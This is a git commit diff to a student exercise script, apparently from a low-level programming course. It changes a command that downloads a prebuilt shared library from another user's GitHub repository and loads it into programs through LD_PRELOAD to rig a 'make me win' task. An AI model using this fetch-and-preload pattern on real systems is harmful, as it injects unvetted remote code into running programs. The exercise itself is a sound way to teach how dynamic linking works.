b53b0637ffeeb9144d0f586a3321bc1d0d70f509
Phrank <ephranky@gmail.com>
2022-06-14 12:44:10 +0100

    retry

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://github.com/gentomacine/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmask.so
-export LD_PRELOAD=/tmp/libmask.so
+wget -P ../ https://github.com/mrdoomus/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
+export LD_PRELOAD=../libhack.so
